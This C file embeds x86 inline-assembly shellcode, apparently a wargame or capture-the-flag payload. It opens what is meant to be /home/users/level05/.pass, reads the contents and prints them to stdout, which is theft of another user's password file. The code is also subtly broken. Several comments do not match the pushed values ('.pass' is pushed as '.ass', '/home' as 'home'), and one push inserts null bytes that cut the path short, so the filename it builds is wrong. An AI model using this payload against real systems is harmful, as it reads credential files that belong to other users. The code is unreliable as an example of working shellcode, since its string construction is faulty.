int main() {
  __asm__ __volatile__(
      // xor eax, eax
      "xor %%eax, %%eax;\n"

      // push ".pass"
      "push $0x7373612e;\n" // ".ass"
      // push "level05"
      "push $0x35306c65;\n"
      // push "/users"
      "push $0x7372652f;\n"
      // push "s/"
      "push $0x2f73;\n"
      // push "/home"
      "push $0x656d6f68;\n"

      // mov ebx, esp   ; pointer to filename
      "mov %%esp, %%ebx;\n"

      // xor ecx, ecx   ; flags = 0 (O_RDONLY)
      "xor %%ecx, %%ecx;\n"

      // mov eax, 5     ; syscall number: open
      "mov $0x5, %%eax;\n"
      "int $0x80;\n"

      // mov ebx, eax   ; store fd
      "mov %%eax, %%ebx;\n"

      // lea ecx, [esp-64]  ; use a safe buffer space
      "lea -64(%%esp), %%ecx;\n"
      // mov edx, 0x28
      "mov $0x28, %%edx;\n"
      // mov eax, 3     ; read syscall
      "mov $0x3, %%eax;\n"
      "int $0x80;\n"

      // write to stdout
      "mov $0x4, %%eax;\n" // write
      "mov $0x1, %%ebx;\n" // stdout
      // ecx already points to buffer
      // edx is still 0x28
      "int $0x80;\n"

      // exit
      "mov $0x1, %%eax;\n"
      "xor %%ebx, %%ebx;\n"
      "int $0x80;\n"
      :
      :
      : "%eax", "%ebx", "%ecx", "%edx");
}
